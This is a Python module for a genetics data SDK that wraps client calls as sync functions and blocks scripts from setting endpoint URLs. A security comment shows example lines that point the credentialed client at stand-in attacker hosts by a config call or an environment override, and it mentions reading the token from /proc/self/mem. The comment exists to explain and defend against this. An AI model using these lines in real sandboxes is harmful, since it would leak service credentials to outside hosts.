"""The `genetics` SDK — importable data access for scripts.

    import genetics_mcp_server.sdk as genetics

    df = genetics.credible_sets(gene="IL7R")
    df.filter(pl.col("pip") > 0.5)

A script needs no knowledge of HTTP, tokens, base URLs or result envelopes: endpoints come
from the environment (GENETICS_API_URL, BIGQUERY_API_URL), every function returns a polars
DataFrame, and a failed request raises GeneticsError instead of returning a success flag to
check. Endpoints are not settable from a script — see the note above `_URL_SETTINGS`.

In the sandbox the credential is the PER-EXECUTION token pair the supervisor minted for
this execution and named to the child by path in SANDBOX_TOKEN_FILE, attached per request
and bound to the destination it is going to — never INTERNAL_API_SECRET, which the sandbox
image does not hold (genetics-results-suite-4h6.44; `tools/executor.py`'s
`_load_sandbox_tokens` and `_SandboxTokenAuth`). Outside the sandbox — the service
processes and local runs — the client still authenticates with INTERNAL_API_SECRET. The two
are mutually exclusive with no fallback between them.

Nothing here imports the chat backend, the MCP server or the databases, so the package can
be installed into a sandbox image on its own.

AN EMPTY RESULT MAY HAVE NO COLUMNS (genetics-results-suite-6uk). The functions backed by
results-api rather than BigQuery — exome, gene_burden, hla(phenotype=...), summary_stats,
ld, search, expression, gene_disease, lookup_phenotype_names — return a bare `[]` with no
schema when nothing matches, so the DataFrame comes back 0x0 and `df.filter(pl.col("beta")
> 0)` raises ColumnNotFoundError instead of yielding an empty frame. Check `df.is_empty()`
(or `df.height == 0`) before naming a column, rather than assuming the shape of an empty
answer. The BigQuery-backed functions and sql() carry their columns through an empty
result.

Every function is also available as an awaitable method on `GeneticsClient` for callers
that already have an event loop.
"""

import functools
import inspect
from typing import Any

from genetics_mcp_server.sdk import _runner
from genetics_mcp_server.sdk.client import GeneticsClient, parse_region
from genetics_mcp_server.sdk.errors import GeneticsError, GeneticsUsageError

_FUNCTIONS = (
    "credible_sets",
    "colocalization",
    "exome",
    "gene_burden",
    "hla",
    "asm_qtl",
    "open_chromatin",
    "peak_to_gene",
    "variant_effect",
    "mpra",
    "mpra_pip_concordance",
    "variant_annotation",
    "gene_annotations",
    "expression",
    "gene_disease",
    "summary_stats",
    "ld",
    "search",
    "lookup_phenotype_names",
    "get_dataset_display_names",
    "normalize_gene_symbols",
    "sql",
    "schema",
    "resources",
    "datasets",
)

_client: GeneticsClient | None = None

# endpoints are not a configuration surface: the client credentials every request to them,
# so accepting a caller-supplied base URL would turn one injected line —
#     genetics.configure(api_base_url="http://attacker.example/api")
#     genetics.expression("APOE")
# — into a credential handed to that host. URLs are therefore read from the environment
# (GENETICS_API_URL, GENETICS_PUBLIC_API_URL, BIGQUERY_API_URL).
#
# THAT IS TIDINESS, NOT A BOUNDARY, and must not be cited as one. The sandbox child is
# forked without exec, so the SCRIPT owns os.environ too: the reads are cached_property
# reads on the executor performed at FIRST USE, and `_client` below stays None until the
# first call, so `os.environ["GENETICS_API_URL"] = "http://evil.attacker.test/api"` ahead
# of that first call redirects the client and takes the token with it — measured. Closing
# this door only makes the obvious way harder than the environment variable, and the
# environment variable is not the hardest way either: the same script can read the token
# out of /proc/self/mem. What actually contains a hostile script is the sandbox's
# deny-by-default egress allow-list plus genetics-results-suite-4h6.55; per
# genetics-results-suite docs/code-execution-security.md, the value of the per-execution
# token (4h6.44, now landed) is that it is short-lived, audience-scoped and ATTRIBUTABLE,
# not that it is unreachable.
_URL_SETTINGS = ("api_base_url", "public_api_url", "bigquery_api_url")


def configure(**kwargs: Any) -> None:
    """Reserved for future non-URL configuration.

    Endpoint URLs are deliberately NOT configurable: see the note above `_URL_SETTINGS`.
    They are read from the environment, so a sandbox script never has to call this.
    """
    rejected = sorted(k for k in kwargs if k in _URL_SETTINGS)
    if rejected:
        raise GeneticsUsageError(
            f"endpoint URLs cannot be set from a script ({', '.join(rejected)}); "
            f"they come from the environment because the client carries internal credentials"
        )
    if kwargs:
        raise GeneticsUsageError(f"unknown settings: {', '.join(sorted(kwargs))}")


def get_client() -> GeneticsClient:
    """The process-wide client. Created on first use so importing costs no connections."""
    global _client
    if _client is None:
        _client = GeneticsClient()
    return _client


def close() -> None:
    """Close the shared client's HTTP connections."""
    global _client
    if _client is not None:
        client, _client = _client, None
        _runner.run(client.close())


def _make_sync(name: str):
    method = getattr(GeneticsClient, name)

    @functools.wraps(method)
    def wrapper(*args: Any, **kwargs: Any):
        return _runner.run(getattr(get_client(), name)(*args, **kwargs))

    # drop `self` so help()/inspect show what a script actually passes
    signature = inspect.signature(method)
    wrapper.__signature__ = signature.replace(
        parameters=list(signature.parameters.values())[1:]
    )
    return wrapper


for _name in _FUNCTIONS:
    globals()[_name] = _make_sync(_name)
del _name

__all__ = [
    *_FUNCTIONS,
    "GeneticsClient",
    "GeneticsError",
    "GeneticsUsageError",
    "close",
    "configure",
    "get_client",
    "parse_region",
]
